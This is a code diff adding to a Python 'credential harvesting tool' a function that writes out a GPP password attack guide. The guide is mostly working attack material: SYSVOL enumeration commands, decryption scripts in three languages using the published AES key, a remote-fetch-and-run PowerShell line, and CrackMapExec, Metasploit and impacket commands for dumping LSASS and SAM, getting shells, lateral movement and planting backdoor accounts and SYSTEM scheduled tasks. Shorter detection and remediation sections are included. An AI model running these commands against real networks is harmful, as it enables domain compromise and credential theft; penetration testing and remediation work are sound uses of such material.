@@ -584,6 +584,627 @@ def save_json(results, filename='cred_details.json'):
         print(f"{RED}[!] Error saving JSON: {e}{RESET}")
 
 
+def save_gpp_attack_guide(filename='GPP_ATTACK_GUIDE.txt'):
+    """Generate comprehensive GPP (Group Policy Preferences) attack guide"""
+    guide_content = """
+================================================================================
+                GPP ATTACK GUIDE - CredSeek v1.0
+      Comprehensive Guide to Group Policy Preferences Exploitation
+================================================================================
+
+This guide provides detailed information on GPP password extraction, exploitation
+methodologies, and remediation strategies. Use responsibly and ethically.
+
+================================================================================
+                        TABLE OF CONTENTS
+================================================================================
+
+1. GPP BACKGROUND
+2. VULNERABILITY OVERVIEW (MS14-025)
+3. ENUMERATION TECHNIQUES
+4. EXPLOITATION METHODS
+5. MANUAL DECRYPTION
+6. AUTOMATED TOOLS
+7. POST-EXPLOITATION
+8. DETECTION AND REMEDIATION
+9. ALTERNATIVE CRED DISCOVERY
+10. RESOURCES
+
+================================================================================
+                        1. GPP BACKGROUND
+================================================================================
+
+GROUP POLICY PREFERENCES (GPP)
+-------------------------------
+- Introduced in Windows Server 2008
+- Allowed administrators to configure local users/groups via Group Policy
+- Could store passwords for:
+  * Local Administrator accounts
+  * Scheduled tasks
+  * Services
+  * Data sources
+  * Mapped drives
+  * Printer connections
+
+STORAGE LOCATION
+----------------
+All GPP configurations stored in SYSVOL:
+\\\\domain.com\\SYSVOL\\domain.com\\Policies\\
+
+Common GPP XML Files:
+- Groups.xml        (Local users/groups)
+- Services.xml      (Service accounts)
+- Scheduledtasks.xml (Scheduled task accounts)
+- DataSources.xml   (Database connections)
+- Printers.xml      (Printer deployment)
+- Drives.xml        (Mapped drives)
+
+ACCESSIBILITY
+-------------
+- SYSVOL is readable by ALL domain users (authenticated users)
+- No special privileges required
+- Works from any domain-joined computer
+- Works from Linux with domain credentials
+
+================================================================================
+                    2. VULNERABILITY OVERVIEW (MS14-025)
+================================================================================
+
+CVE-2014-1812
+-------------
+Microsoft published the AES encryption key used to "protect" GPP passwords.
+
+Key Details:
+- 32-byte AES-256 key published in MSDN documentation
+- Key is same across ALL Windows domains worldwide
+- Cannot be changed by administrators
+- Allows anyone to decrypt GPP passwords
+
+Impact:
+- CRITICAL - Any domain user can decrypt GPP passwords
+- Often leads to local administrator password disclosure
+- May expose service account credentials
+- Can compromise entire domain if admin accounts shared
+
+Timeline:
+- Vulnerability: 2008-2014 (6 years!)
+- Disclosed: April 2014
+- Patched: MS14-025 (May 2014)
+- Patch only prevents NEW GPP passwords
+- DOES NOT remove existing GPP passwords
+- Legacy systems still vulnerable
+
+================================================================================
+                    3. ENUMERATION TECHNIQUES
+================================================================================
+
+METHOD 1: SMB FILE ENUMERATION
+-------------------------------
+# List SYSVOL contents (Windows)
+dir \\\\domain.com\\SYSVOL\\domain.com\\Policies\\ /s
+
+# Search for GPP XML files (Windows)
+dir \\\\domain.com\\SYSVOL\\*.xml /s
+
+# Find files containing "cpassword" (Windows)
+findstr /S /I cpassword \\\\domain.com\\SYSVOL\\*.xml
+
+# Linux with smbclient
+smbclient //domain.com/SYSVOL -U 'DOMAIN\\user%password'
+recurse ON
+prompt OFF
+mget *
+
+# Linux with cifs-utils
+mount -t cifs //domain.com/SYSVOL /mnt/sysvol -o username=user,domain=DOMAIN
+grep -r "cpassword" /mnt/sysvol/
+
+METHOD 2: CRACKMAPEXEC
+----------------------
+# Auto-find and decrypt GPP passwords
+crackmapexec smb 10.10.10.10 -u user -p password -M gpp_password
+
+# Multiple DCs
+crackmapexec smb dclist.txt -u user -p password -M gpp_password
+
+METHOD 3: IMPACKET
+------------------
+# Mount SYSVOL with smbclient.py
+smbclient.py DOMAIN/user:password@10.10.10.10
+use SYSVOL
+ls
+get Groups.xml
+
+# Or use Get-GPPPassword.py (custom script)
+python Get-GPPPassword.py DOMAIN/user:password@10.10.10.10
+
+METHOD 4: METASPLOIT
+--------------------
+# Post-exploitation module
+use post/windows/gather/credentials/gpp
+set SESSION 1
+run
+
+# Or as auxiliary scanner
+use auxiliary/scanner/smb/smb_enum_gpp
+set RHOSTS 10.10.10.10
+set SMBUser user
+set SMBPass password
+run
+
+METHOD 5: POWERSPLOIT (WINDOWS)
+--------------------------------
+# PowerSploit Get-GPPPassword
+Import-Module PowerSploit.psd1
+Get-GPPPassword
+
+# Or inline
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1')
+Get-GPPPassword
+
+METHOD 6: MANUAL SEARCH (LINUX)
+--------------------------------
+# Mount SYSVOL
+mkdir /mnt/sysvol
+mount -t cifs //10.10.10.10/SYSVOL /mnt/sysvol -o user=username,domain=DOMAIN
+
+# Find all GPP XML files
+find /mnt/sysvol -name "*.xml" -type f
+
+# Search for cpassword attribute
+find /mnt/sysvol -name "*.xml" -type f -exec grep -l "cpassword" {} \\;
+
+# Extract cpassword values
+grep -r "cpassword=" /mnt/sysvol/ | cut -d'"' -f2
+
+================================================================================
+                    4. EXPLOITATION METHODS
+================================================================================
+
+TYPICAL ATTACK FLOW
+-------------------
+1. Obtain domain user credentials (ANY domain user)
+2. Access SYSVOL share (read-only access sufficient)
+3. Search for GPP XML files (Groups.xml, etc.)
+4. Extract "cpassword" attribute values
+5. Decrypt using public AES key
+6. Use recovered credentials for privilege escalation
+
+EXAMPLE GPP XML STRUCTURE
+--------------------------
+Groups.xml typically contains:
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
+        name="Administrator" 
+        image="2" 
+        changed="2012-06-14 13:01:23" 
+        uid="{CD07A26F-A95B-4F4B-A6A9-5E7B05C1D4F0}">
+    <Properties action="U" 
+                newName="" 
+                fullName="Built-in Administrator" 
+                description="Local Administrator Account" 
+                cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw" 
+                changeLogon="0" 
+                noChange="1" 
+                neverExpires="1" 
+                acctDisabled="0" 
+                userName="Administrator"/>
+  </User>
+</Groups>
+
+The "cpassword" value is the encrypted password.
+
+DECRYPTION PROCESS
+------------------
+1. Base64-decode the cpassword string
+2. Use public AES-256 key (32 bytes):
+   4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e5 
+   f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b
+3. AES-256 decrypt in CBC mode
+4. UTF-16LE decode to get plaintext password
+
+PUBLIC AES KEY (Python bytes):
+key = b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe5\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'
+
+================================================================================
+                    5. MANUAL DECRYPTION
+================================================================================
+
+PYTHON SCRIPT
+-------------
+#!/usr/bin/env python3
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+def decrypt_gpp_password(cpassword):
+    # Microsoft published AES key
+    key = b'\\x4e\\x99\\x06\\xe8\\xfc\\xb6\\x6c\\xc9\\xfa\\xf4\\x93\\x10\\x62\\x0f\\xfe\\xe5\\xf4\\x96\\xe8\\x06\\xcc\\x05\\x79\\x90\\x20\\x9b\\x09\\xa4\\x33\\xb6\\x6c\\x1b'
+    
+    # Add padding if needed
+    padding = len(cpassword) % 4
+    if padding:
+        cpassword += '=' * (4 - padding)
+    
+    # Decode base64
+    encrypted = base64.b64decode(cpassword)
+    
+    # Extract IV (first 16 bytes)
+    iv = encrypted[:16]
+    ciphertext = encrypted[16:]
+    
+    # Decrypt
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    
+    # Decode UTF-16LE
+    password = plaintext.decode('utf-16-le')
+    return password
+
+# Usage
+cpassword = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
+password = decrypt_gpp_password(cpassword)
+print(f"Password: {password}")
+
+RUBY SCRIPT (gpp-decrypt)
+--------------------------
+#!/usr/bin/env ruby
+require 'openssl'
+require 'base64'
+
+def decrypt_gpp(cpassword)
+  key = ["4e9906e8fcb66cc9faf4931062..."].pack("H*")
+  
+  # Decode and decrypt
+  encrypted = Base64.decode64(cpassword)
+  decipher = OpenSSL::Cipher.new('AES-256-CBC')
+  decipher.decrypt
+  decipher.key = key
+  
+  plaintext = decipher.update(encrypted) + decipher.final
+  return plaintext.force_encoding('UTF-16LE').encode('UTF-8')
+end
+
+puts decrypt_gpp(ARGV[0])
+
+POWERSHELL DECRYPTION
+----------------------
+function Decrypt-GPPPassword {
+    param([string]$cpassword)
+    
+    $key = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
+             0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe5,
+             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
+             0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
+    
+    # Add padding
+    $mod = $cpassword.Length % 4
+    if ($mod -ne 0) {
+        $cpassword += '=' * (4 - $mod)
+    }
+    
+    $encrypted = [Convert]::FromBase64String($cpassword)
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key = $key
+    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.IV = $encrypted[0..15]
+    
+    $decryptor = $aes.CreateDecryptor()
+    $plaintext = $decryptor.TransformFinalBlock($encrypted, 16, $encrypted.Length - 16)
+    
+    return [System.Text.Encoding]::Unicode.GetString($plaintext)
+}
+
+# Usage
+$cpass = "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
+Decrypt-GPPPassword $cpass
+
+================================================================================
+                    6. AUTOMATED TOOLS
+================================================================================
+
+GPP-DECRYPT (KALI LINUX)
+-------------------------
+# Pre-installed on Kali Linux
+gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
+
+# Install on other systems
+gem install gpp-decrypt
+
+CRACKMAPEXEC MODULE
+-------------------
+# Auto-find and decrypt
+crackmapexec smb 10.10.10.10 -u user -p password -M gpp_password
+
+# Output includes:
+# - Username found
+# - Decrypted password
+# - XML file location
+
+GET-GPPP
+
+ASSWORD.PS1 (PowerSploit)
+------------------------------------
+# From Windows host (domain-joined)
+Import-Module .\\PowerSploit.psd1
+Get-GPPPassword
+
+# Remote execution
+Invoke-Command -ComputerName DC01 -ScriptBlock { Get-GPPPassword }
+
+# Output format:
+# UserName  : Administrator
+# Password  : P@ssw0rd123
+# Changed   : 6/14/2012 1:01:23 PM
+# File      : \\\\domain.com\\SYSVOL\\..\\Groups.xml
+
+METASPLOIT MODULE
+-----------------
+# Post module (requires session)
+use post/windows/gather/credentials/gpp
+set SESSION 1
+run
+
+# Scanner module (requires credentials)
+use auxiliary/scanner/smb/smb_enum_gpp
+set RHOSTS 10.10.10.0/24
+set SMBDomain DOMAIN
+set SMBUser user
+set SMBPass password
+run
+
+IMPACKET GET-GPPPassword.py
+---------------------------
+# Custom script (community-developed)
+python3 Get-GPPPassword.py DOMAIN/user:password@10.10.10.10
+
+# Or manual with smbclient.py
+smbclient.py DOMAIN/user:password@10.10.10.10
+use SYSVOL
+recurse ON
+prompt OFF
+mget *.xml
+
+# Then decrypt locally
+grep -r "cpassword=" . | cut -d'"' -f2 | while read cpass; do
+    gpp-decrypt "$cpass"
+done
+
+LINUX ONE-LINER
+---------------
+# Mount, search, extract, decrypt
+mount -t cifs //10.10.10.10/SYSVOL /mnt/sysvol -o user=username,domain=DOMAIN && \\
+grep -roP 'cpassword="\\K[^"]+' /mnt/sysvol | while read cpass; do gpp-decrypt "$cpass"; done
+
+================================================================================
+                    7. POST-EXPLOITATION
+================================================================================
+
+TYPICAL FINDINGS
+----------------
+1. Local Administrator passwords
+   - Often same password across all workstations
+   - Immediate privilege escalation on multiple systems
+   
+2. Service account credentials
+   - May have elevated privileges
+   - Could be domain admin
+   
+3. Scheduled task accounts
+   - Often run with SYSTEM or admin privileges
+   - Persistence opportunities
+
+PRIVILEGE ESCALATION
+---------------------
+# If you find local admin password
+crackmapexec smb 10.10.10.0/24 -u Administrator -p 'recovered_password' --local-auth
+
+# Check SAM access
+crackmapexec smb 10.10.10.50 -u Administrator -p 'recovered_password' --sam
+
+# Dump LSASS
+crackmapexec smb 10.10.10.50 -u Administrator -p 'recovered_password' --lsa
+
+# Get shell
+psexec.py Administrator:recovered_password@10.10.10.50
+
+LATERAL MOVEMENT
+----------------
+# If password is reused across domain
+crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password'
+
+# Check admin access
+crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password' --shares
+
+# Execute commands
+crackmapexec smb 10.10.10.0/24 -u recovered_user -p 'recovered_password' -x whoami
+
+PERSISTENCE
+-----------
+# If you get admin via GPP password
+# Add new local admin (less likely to be detected)
+net user backdoor P@ssw0rd123 /add
+net localgroup Administrators backdoor /add
+
+# Create scheduled task
+schtasks /create /tn "Windows Update" /tr "cmd /c powershell -enc <base64>" /sc onlogon /ru SYSTEM
+
+# Dump more credentials
+secretsdump.py Administrator:recovered_password@10.10.10.50
+
+================================================================================
+                    8. DETECTION AND REMEDIATION
+================================================================================
+
+DETECTION
+---------
+1. Monitor SYSVOL access logs
+   - Look for unusual patterns
+   - Multiple XML file reads
+   - Access from unexpected hosts
+
+2. File integrity monitoring
+   - Alert on GPP XML file creation
+   - Alert on modifications
+
+3. Group Policy auditing
+   - Event ID 4662 (Operation performed on object)
+   - Monitor "Read All Properties" on GP objects
+
+4. PowerShell logging
+   - Look for Get-GPPPassword execution
+   - ScriptBlock logging for GPP keywords
+
+REMEDIATION
+-----------
+1. DELETE GPP passwords immediately:
+   # PowerShell - Find all GPP passwords
+   Get-ChildItem -Path "\\\\domain.com\\SYSVOL" -Recurse -Include *.xml | 
+   Select-String -Pattern "cpassword" | 
+   Select-Object -ExpandProperty Path | 
+   Get-Unique
+   
+   # Manually review and delete each file OR
+   # Remove just the cpassword attribute
+
+2. Use LAPS (Local Administrator Password Solution):
+   - Microsoft's official solution
+   - Randomizes local admin passwords
+   - Stores in AD with ACLs
+   - Automatic password rotation
+   
+   Download: https://www.microsoft.com/en-us/download/details.aspx?id=46899
+
+3. Alternative: Use Configuration Manager
+   - Centralized credential management
+   - Proper encryption
+   - Audit logging
+
+4. Group Policy best practices:
+   - Never store passwords in Group Policy
+   - Use service accounts with minimal privileges
+   - Rotate credentials regularly
+   - Implement least privilege
+
+VERIFICATION
+------------
+# Check for remaining GPP passwords
+findstr /S /I cpassword \\\\domain.com\\SYSVOL\\*.xml
+
+# Should return: "File not found" or no results
+
+# PowerShell verification
+Get-ChildItem -Path "\\\\$env:USERDNSDOMAIN\\SYSVOL" -Recurse -Include *.xml |
+Select-String -Pattern "cpassword" -List |
+Select-Object Path
+
+================================================================================
+                    9. ALTERNATIVE CRED DISCOVERY
+================================================================================
+
+If GPP passwords are cleaned up, look for:
+
+REGISTRY CREDENTIALS
+--------------------
+# Windows AutoLogon credentials
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+
+# VNC passwords
+reg query HKCU\\Software\\ORL\\WinVNC3\\Password
+reg query HKLM\\SOFTWARE\\RealVNC\\WinVNC4
+
+# PuTTY sessions
+reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions
+
+FILE-BASED CREDENTIALS
+----------------------
+# Unattend.xml files
+C:\\Windows\\Panther\\Unattend.xml
+C:\\Windows\\Panther\\Unattend\\Unattend.xml
+
+# PowerShell history
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# IIS web.config
+C:\\inetpub\\wwwroot\\web.config
+
+# Application config files
+*.config containing "password="
+
+NETWORK CREDENTIALS
+-------------------
+# Saved credentials
+cmdkey /list
+
+# Credential Manager
+vaultcmd /listcreds:"Windows Credentials" /all
+
+SCRIPT AND CONFIG FILES
+-----------------------
+# Search for passwords in files
+findstr /si password *.txt *.xml *.config *.ini *.bat *.ps1
+
+# .env files (web apps)
+dir /s .env
+
+# Git repositories (.git/config)
+dir /s /a .git
+
+================================================================================
+                    10. RESOURCES
+================================================================================
+
+Official Documentation:
+- MS14-025: https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025
+- LAPS: https://www.microsoft.com/en-us/download/details.aspx?id=46899
+- GPP Documentation: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn581922(v=ws.11)
+
+Tools:
+- gpp-decrypt: https://github.com/leonjza/gpp-decrypt
+- PowerSploit Get-GPPPassword: https://github.com/PowerShellMafia/PowerSploit
+- CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
+- Metasploit GPP modules: https://www.rapid7.com/db/modules/
+
+Research Papers:
+- "Group Policy Pwnage" - Chris Campbell
+- "GPP Password Exploitation" - Rapid7
+
+Community Resources:
+- https://adsecurity.org/
+- https://pentestlab.blog/
+- https://attack.mitre.org/techniques/T1552/006/
+
+================================================================================
+                        FINAL NOTES
+================================================================================
+
+This guide is for authorized security testing only. Always:
+- Obtain proper authorization before testing
+- Follow ethical hacking guidelines
+- Report findings professionally
+- Help organizations remediate properly
+
+Remember: GPP passwords are low-hanging fruit. Check for them on EVERY
+Windows domain assessment. The exploitation is trivial, but the impact can
+be critical.
+
+================================================================================
+                Generated by CredSeek v1.0
+                github.com/Lokii-git/seeksweet
+================================================================================
+"""
+    
+    try:
+        with open(filename, 'w') as f:
+            f.write(guide_content)
+        print(f"{GREEN}[+] GPP attack guide saved to: {filename}{RESET}")
+        return filename
+    except Exception as e:
+        print(f"{RED}[!] Error saving GPP guide: {e}{RESET}")
+        return None
+
+
 def main():
     parser = argparse.ArgumentParser(
         description='CredSeek - Credential Harvesting Tool',
@@ -694,6 +1315,10 @@ Examples:
             save_found_credentials(results)
         save_details(results)
         save_json(results)
+        
+        # Generate GPP guide if GPP passwords found or --gpp flag used
+        if total_gpp > 0 or args.gpp:
+            save_gpp_attack_guide()
     
     print(f"\n{GREEN}[+] Scan complete!{RESET}")
 
